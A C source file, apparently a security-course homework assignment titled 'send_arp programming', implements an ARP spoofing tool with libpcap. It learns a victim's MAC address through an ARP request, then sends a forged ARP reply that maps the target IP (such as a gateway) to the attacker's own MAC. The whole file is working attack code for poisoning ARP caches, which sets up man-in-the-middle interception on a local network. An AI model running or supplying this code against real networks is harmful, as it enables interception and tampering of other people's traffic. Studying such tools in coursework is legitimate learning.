/****************************************************************************************
*                                                                                       *
*   Subject : Subject 26                                                                *
*   Prof : gilgil                                                                       *
*   Student Name : Lim Kyung Dai                                                        * 
*   Student ID : 2015410209                                                             *
*                                                                                       *
*   - HW2 : send_arp programming                                                        *
*                                                                           	        *
****************************************************************************************/

#include <stdio.h>
#include "my_send_arp.h"

void usage() {
  printf("syntax: pcap_test <interface> [senderIP] [targetIP]\n");
  printf("sample: pcap_test wlan0 192.168.163.134 192.168.163.2\n");
}

int main(int argc, char* argv[])
{
	if (argc < 4) {
    	usage();
    	return -1;
  	}
  	#define SIZE_ETHERNET 14
	struct ifreq ifr;
    	struct ifconf ifc;
    	struct in_addr senderIP, targetIP;
    	struct sniff_ethernet* eth;
	struct sniff_ethernet* recv_eth;
	struct arphdr* arp;
	struct arphdr* recv_arp;
	struct pcap_pkthdr* header;
	u_char* packet;
	char buf[1024];
    	u_char mac_address[6];
   	u_char recv_mac[6];
  	int success = 0;
    	int packet_len;
   	int i;

   	inet_pton(AF_INET,argv[2],&senderIP.s_addr);
	inet_pton(AF_INET,argv[3],&targetIP.s_addr);

/**************************************************************************************************
					get my mac address
***************************************************************************************************/
 	int sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_IP);
 	if (sock == -1) { /* handle error*/ };

    	ifc.ifc_len = sizeof(buf);
    	ifc.ifc_buf = buf;
    	if (ioctl(sock, SIOCGIFCONF, &ifc) == -1) { /* handle error */ }

    	struct ifreq* it = ifc.ifc_req;
    	const struct ifreq* const end = it + (ifc.ifc_len / sizeof(struct ifreq));

    	for (; it != end; ++it) {
        	strcpy(ifr.ifr_name, it->ifr_name);
        	if (ioctl(sock, SIOCGIFFLAGS, &ifr) == 0) {
            		if (! (ifr.ifr_flags & IFF_LOOPBACK)) { // don't count loopback
                		if (ioctl(sock, SIOCGIFHWADDR, &ifr) == 0) {
                    			success = 1;
                    			break;
                		}
            		}
        	}
        	else { /* handle error */ }
    	}

    	if (success) memcpy(mac_address, ifr.ifr_hwaddr.sa_data, 6);

    	printf("\n[+]My Mac Address : ");
    	for(i=0;i<6;i++)
    	{
    		printf("%02x",mac_address[i]);
    		if(i != 5) printf(":");
    	
    	}
    	printf("\n");

/**************************************************************************************************
					get my ip address
***************************************************************************************************/
	ifr.ifr_addr.sa_family = AF_INET;
	strncpy(ifr.ifr_name , argv[1] , IFNAMSIZ - 1);
	ioctl(sock, SIOCGIFADDR, &ifr);
	struct in_addr my_ip_addr = ((struct sockaddr_in *)&ifr.ifr_addr)->sin_addr;

	printf("[+]My IP Address  : %s\n",inet_ntoa(my_ip_addr));

	close(sock);

/**************************************************************************************************
				     make a broadcast packet
***************************************************************************************************/

	eth = (struct sniff_ethernet*)malloc(sizeof(struct sniff_ethernet));
	arp = (struct arphdr*)malloc(sizeof(struct arphdr));
	memcpy(eth->ether_dhost,"\xff\xff\xff\xff\xff\xff",ETHER_ADDR_LEN);
	memcpy(eth->ether_shost,mac_address,ETHER_ADDR_LEN);
	eth->ether_type = htons(0x0806);
	arp->htype = htons(0x0001);
	arp->ptype = htons(0x0800);
	arp->hlen = 0x06;
	arp->plen = 0x04;
	arp->oper = htons(0x0001);
	memcpy(arp->sha,mac_address,6);
	memcpy(arp->spa,&my_ip_addr,4);
	memcpy(arp->tha,"\x00\x00\x00\x00\x00\x00",6);
	memcpy(arp->tpa,&senderIP,4);
	packet = (u_char*)malloc(sizeof(struct sniff_ethernet)+sizeof(struct arphdr));

	memcpy(packet,eth,sizeof(struct sniff_ethernet));
	memcpy(packet+sizeof(struct sniff_ethernet),arp,sizeof(struct arphdr));
	packet_len = sizeof(struct sniff_ethernet) + sizeof(struct arphdr);
	printf("\n[*]A broadcast packet is made.\n");

/**************************************************************************************************
				  send a broadcast packet
***************************************************************************************************/

  	char* dev = argv[1];
 	char errbuf[PCAP_ERRBUF_SIZE];
 	pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
 	if (handle == NULL) {
    		fprintf(stderr, "couldn't open device %s: %s\n", dev, errbuf);
    		return -1;
  	}
  	
	while(1){
		if(pcap_sendpacket(handle,packet,packet_len) == 0){
			printf("\n[*]Send a packet to get a [%s]'s Mac Address\n",inet_ntoa(senderIP));
			printf("\n[*]ARP REQUEST![*]\n");	
			break;
		}
	}

/**************************************************************************************************
				    receive a reply packet
***************************************************************************************************/	
	
	while (1) {
    			int res = pcap_next_ex(handle, &header, &packet);
    			if (res == 0) continue;
    			if (res == -1 || res == -2) break;
    			/*
     				-1 if an error occurred 
     				-2 if EOF was reached reading from an offline capture
    			*/
    			recv_eth = (struct sniff_ethernet*)packet;
    			if(ntohs(recv_eth->ether_type) == 0x0806) //arp
    			{
    				recv_arp = (struct arphdr*)(packet + SIZE_ETHERNET);

    				if(ntohs(recv_arp->oper) == 0x0002)
    				{
    					char* ptr;
  	
					u_char* ip_buf_tmp = (u_char*)malloc(4);
    					sprintf(ip_buf_tmp, "%x%x%x%x",recv_arp->spa[3],recv_arp->spa[2],recv_arp->spa[1],recv_arp->spa[0]);
    		
    					if(senderIP.s_addr == strtol(ip_buf_tmp,&ptr,16))
    					{
    						printf("\n[*]ARP_REPLY![*]\n");
    						printf("\n[+]packet binary[+]");
    						for(i=0;i<60;i++)
   						{	
   							if(i%8 == 0) printf("\n");
    							printf("%02x ",packet[i]);
    						}
    						printf("\n");
    						memcpy(recv_mac,recv_eth->ether_shost,6);
	    					printf("\n[+]Sender's Mac Address : ");
    						for(i=0;i<6;i++)
    						{
    							printf("%02x",recv_mac[i]);
    							if(i != 5) printf(":");
    	
    						}
    						printf("\n");
    					}
    				}
   			 }
    			 break;
	}
/**************************************************************************************************
				    make a fake reply packet
***************************************************************************************************/

	eth = (struct sniff_ethernet*)malloc(sizeof(struct sniff_ethernet));
	arp = (struct arphdr*)malloc(sizeof(struct arphdr));
	memcpy(eth->ether_dhost,recv_mac,ETHER_ADDR_LEN);
	memcpy(eth->ether_shost,mac_address,ETHER_ADDR_LEN);
	eth->ether_type = htons(0x0806);
	arp->htype = htons(0x0001);
	arp->ptype = htons(0x0800);
	arp->hlen = 0x06;
	arp->plen = 0x04;
	arp->oper = htons(0x0002);
	memcpy(arp->sha,mac_address,6);
	memcpy(arp->spa,&targetIP,4);
	memcpy(arp->tha,recv_mac,6);
	memcpy(arp->tpa,&senderIP,4);
	packet = (u_char*)malloc(sizeof(struct sniff_ethernet)+sizeof(struct arphdr));

	memcpy(packet,eth,sizeof(struct sniff_ethernet));
	memcpy(packet+sizeof(struct sniff_ethernet),arp,sizeof(struct arphdr));
	packet_len = sizeof(struct sniff_ethernet) + sizeof(struct arphdr);
	printf("\n[*]A fake reply packet is made.\n");

/**************************************************************************************************
				    send a fake reply packet
***************************************************************************************************/
	while(1){
		if(pcap_sendpacket(handle,packet,packet_len) == 0){
			printf("\n[*]Send a fake reply packet to change [%s]'s Mac Address ",inet_ntoa(targetIP));
			printf("into [%s]'s Mac Address.\n",inet_ntoa(my_ip_addr));
			break;
		}
	}
} 	
